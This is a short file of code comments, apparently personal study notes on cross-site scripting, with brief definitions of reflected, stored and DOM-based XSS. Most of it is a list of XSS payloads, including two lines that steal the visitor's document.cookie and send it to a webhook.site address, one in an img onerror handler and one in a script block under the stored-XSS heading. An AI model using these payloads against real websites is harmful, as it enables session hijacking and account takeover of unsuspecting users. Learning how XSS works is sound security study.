//* paylods
// <script>alert(1)</script>
// <svg onload="alert(1)'>
// <img src=1 onerror=alert(1)>
// <img src=1 onerror="new Image().src='https://webhook.site/2dc62e00-4e6c-4a13-a2ff-0cc59cc7dd90?cookie='+document.cookie;">

//? reflected xss
// direct result injection into the code
//? stored xss
// stored in the database and then reflected back to the user
// <script>
// new Image().src="https://webhook.site/2dc62e00-4e6c-4a13-a2ff-0cc59cc7dd90?cookie="+document.cookie;
// </script>;
//? dom based xss
// exploiting a source being passed into a sink

//* DOM XSS in jQuery
//* DOM XSS in angular